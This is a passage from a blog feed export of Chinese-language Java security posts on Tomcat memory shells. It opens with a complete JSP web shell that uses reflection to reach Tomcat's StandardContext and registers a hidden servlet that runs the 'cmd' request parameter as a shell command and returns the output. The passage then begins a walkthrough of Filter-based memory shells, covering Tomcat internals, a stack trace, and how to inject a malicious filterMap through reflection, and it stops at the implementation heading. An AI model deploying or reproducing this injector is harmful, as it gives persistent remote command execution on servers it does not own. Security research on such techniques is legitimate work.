class="number">1</span>);</span><br><span class="line">            wrapper.setServlet(servletMemoryShell);</span><br><span class="line">            wrapper.setServletClass(servletMemoryShell.getClass().getName());</span><br><span class="line"></span><br><span class="line">            standardContext.addChild(wrapper);</span><br><span class="line">            standardContext.addServletMapping(<span class="string">&quot;/servletMemoryShell&quot;</span>, <span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line"></span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Servlet Inject Successfully...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Servlet/6.png"></p><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">servletMapping</span> <span class="operator">=</span> standardContext.findServletMapping(<span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (servletMapping != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setName(<span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">servletMemoryShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">httpServletResponse</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                httpServletResponse.getWriter().write(output);</span><br><span class="line">                httpServletResponse.getWriter().flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setServlet(servletMemoryShell);</span><br><span class="line">    wrapper.setServletClass(servletMemoryShell.getClass().getName());</span><br><span class="line"></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMapping(<span class="string">&quot;/servletMemoryShell&quot;</span>, <span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line"></span><br><span class="line">    response.getWriter().write(<span class="string">&quot;Servlet Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Servlet/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Filter</title>
      <link href="/2024/05/18/Tomcat-Filter/"/>
      <url>/2024/05/18/Tomcat-Filter/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>Servlet规范中规定了的一个ServletContext接口，其提供了Web应用所有Servlet的视图，通过它可以对某个Web应用的各种资源和功能进行访问。Web容器在启动时，它会为每个Web应用程序都创建一个对应的ServletContext，它代表当前Web应用，并且它被所有客户端共享。</p><p><img src="/2024/05/18/Tomcat-Filter/1.png"></p><p>动态注册filter时需要添加filter相关的函数，而ServletContext恰好可以满足这个条件。javax.servlet.servletContext中存在addFilter、addServlet和addListener方法，即对应实现添加Filter、Servlet和Listener。</p><p>获取ServletContext的方法有：</p><ul><li><p>this.getServletContext()</p></li><li><p>this.getimg&#x2F;ServletConfig().getServletContext();</p></li></ul><p><img src="/2024/05/18/Tomcat-Filter/2.png"></p><p>可以看到，获取到的实际上是一个ApplicationContextFacade对象，且该对象是对ApplicationContext实例的封装。</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>对应Tomcat容器，为了满足Servlet规范，必须包含一个ServletContext接口的实现。Tomcat的Context容器中都会包含一个ApplicationContext。</p><p>在Tomcat中，org.apache.catalina.core.ApplicationContext中包含一个ServletContext接口的实现，所以需要引入org.apache.catalina.core.ApplicationContext这个库，用它获取上下文StandardContext。</p><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext<a href="https://www.cnblogs.com/nice0e3/p/14622879.html#standardcontext"></a></h3><p>Catalina主要包括Connector和Container，StandardContext就是一个Container，它主要负责对进入的用户请求进行处理。实际上，并不是由StandardContext来进行处理，而是交给内部的valve进行处理。</p><p>一个Context表示了一个外部应用，它包含多个Wrapper，每个Wrapper表示一个Servlet定义。（Tomcat默认的Service服务是Catalina）</p><h3 id="Filter-Related-Variables"><a href="#Filter-Related-Variables" class="headerlink" title="Filter Related Variables"></a>Filter Related Variables</h3><table><thead><tr><th align="center">名称</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">filterMaps 变量</td><td align="center">存放FilterMap的数组，在FilterMap中主要存放了FilterName和对应的URLPattern</td></tr><tr><td align="center">filterDefs 变量</td><td align="center">存放FilterDef的数组，FilterDef中存储着我们过滤器名，过滤器实例等基本信息</td></tr><tr><td align="center">filterConfigs 变量</td><td align="center">存放filterConfig的数组，在FilterConfig中主要存放FilterDef和Filter对象等信息</td></tr><tr><td align="center">FilterChain 变量</td><td align="center">过滤器链，该对象上的doFilter方法能依次调用链上的Filter</td></tr><tr><td align="center">ApplicationFilterChain</td><td align="center">调用过滤器链</td></tr><tr><td align="center">ApplicationFilterConfig</td><td align="center">获取过滤器</td></tr><tr><td align="center">ApplicationFilterFactory</td><td align="center">组装过滤器链</td></tr><tr><td align="center">StandardContext</td><td align="center">Context接口的标准实现类，一个Context代表一个Web应用，其下可以包含多个Wrapper</td></tr><tr><td align="center">StandardWrapperValve</td><td align="center">Wrapper的标准实现类，一个Wrapper代表一个Servlet</td></tr></tbody></table><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><ul><li>环境搭建</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;HelloServlet&quot;, value = &quot;/HelloServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        writer.println(<span class="string">&quot;This is HelloServlet Page.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;HelloFilter&quot;, urlPatterns = &quot;/HelloServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter Destroy...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter Start...&quot;</span>);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Filter/3.png"></p><p>在doFilter中下个断点，堆栈信息如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">doFilter:<span class="number">19</span>, HelloFilter (filter)</span><br><span class="line">internalDoFilter:<span class="number">181</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">156</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">167</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">90</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">494</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">130</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">93</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">682</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">74</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">343</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">617</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">63</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">932</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1695</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">745</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>在堆栈信息中可以看到Container容器中四种子容器的调用，StandardEngineValve-&gt;StandardHostValve-&gt;StandardContextValve-&gt;StandardWrapperValve。往前回溯一下，跟进org.apache.catalina.core.StandardWrapperValve#invoke，可以看到其创建了一个FilterChain，接着调用它的doFilter方法。</p><p><img src="/2024/05/18/Tomcat-Filter/4.png"></p><p>这里跟进一下org.apache.catalina.core.ApplicationFilterFactory#createFilterChain方法，看看是如何创建filterChain的。首先对传入的ServletRequest对象进行判断，若为Request实例，则进一步从其中获取filterChain，若filterChain不存在，则创建一个并设置到Request对象内。</p><p>接着从wrapper中获取StandardContext对象，调用org.apache.catalina.core.StandardContext#findFilterMaps方法获取filterMaps。</p><p>当获取到的filterMaps不为空时，对filterMaps进行遍历，调用getFilterName方法来获取filterName，把获取到的filterName传入org.apache.catalina.core.StandardContext#findFilterConfig方法中来获取filterConfig，并将获取到的filterConfig添加进filterChain中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                                       Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If there is no servlet to execute, return null</span></span><br><span class="line">  <span class="keyword">if</span> (servlet == <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create and initialize a filter chain object</span></span><br><span class="line">  <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">    <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">      <span class="comment">// Security: Do not recycle</span></span><br><span class="line">      filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      filterChain = (ApplicationFilterChain) req.getFilterChain();</span><br><span class="line">      <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        req.setFilterChain(filterChain);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Request dispatcher in use</span></span><br><span class="line">    filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  filterChain.setServlet(servlet);</span><br><span class="line">  filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Acquire the filter mappings for this Context</span></span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">  FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If there are no filter mappings, we are done</span></span><br><span class="line">  <span class="keyword">if</span> ((filterMaps == <span class="literal">null</span>) || (filterMaps.length == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (filterChain);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Acquire the information we will need to match filter mappings</span></span><br><span class="line">  <span class="type">DispatcherType</span> <span class="variable">dispatcher</span> <span class="operator">=</span></span><br><span class="line">    (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);</span><br><span class="line"></span><br><span class="line">  <span class="type">String</span> <span class="variable">requestPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="type">Object</span> <span class="variable">attribute</span> <span class="operator">=</span> request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);</span><br><span class="line">  <span class="keyword">if</span> (attribute != <span class="literal">null</span>)&#123;</span><br><span class="line">    requestPath = attribute.toString();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add the relevant path-mapped filters to this filter chain</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!matchDispatcher(filterMaps[i] ,dispatcher)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!matchFiltersURL(filterMaps[i], requestPath))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">      context.findFilterConfig(filterMaps[i].getFilterName());</span><br><span class="line">    <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    filterChain.addFilter(filterConfig);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add filters that match on servlet name second</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!matchDispatcher(filterMaps[i] ,dispatcher)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!matchFiltersServlet(filterMaps[i], servletName))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">      context.findFilterConfig(filterMaps[i].getFilterName());</span><br><span class="line">    <span class="keyword">if</span> (filterConfig == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// FIXME - log configuration problem</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    filterChain.addFilter(filterConfig);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return the completed filter chain</span></span><br><span class="line">  <span class="keyword">return</span> filterChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续前面的堆栈分析，跟进org.apache.catalina.core.ApplicationFilterChain#doFilter方法，其先检查JVM是否开启安全模式，由于这里为false，因此会进入else语句中调用internalDoFilter方法。</p><p><img src="/2024/05/18/Tomcat-Filter/5.png"></p><p>跟进org.apache.catalina.core.ApplicationFilterChain#internalDoFilter方法，先从this,filters数组中依次取出filterConfig对象，接着调用org.apache.catalina.core.ApplicationFilterConfig#getFilter方法获取Filter实例，最后调用其doFilter方法。</p><p><img src="/2024/05/18/Tomcat-Filter/6.png"></p><p>上文中分析了创建filterChain时主要依赖于filterMaps，接下来看看如何向filterMaps中添加恶意的filterMap。在org.apache.catalina.core.StandardContext中有两个方法可以向filterMaps中添加filterMap，分别是addFilterMap方法和addFilterMapBefore方法。</p><p><img src="/2024/05/18/Tomcat-Filter/7.png"></p><p>跟进org.apache.catalina.core.StandardContext#validateFilterMap方法，该方法会对传入的filterMap进行判断，若this.findFilterDef &#x3D;&#x3D; null时则会抛出异常，因此在构造时，需要注意构造符合要求的filterDef。</p><p><img src="/2024/05/18/Tomcat-Filter/8.png"></p><p>上文中提到的filterMap、filterDef都与filterConfig相关，而org.apache.catalina.core.StandardContext中与filterConfig相关的操作只有filterStart和filterStop方法，因此在应用运行时，只能采用反射的方式来动态修改filterConfigs的值。</p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" 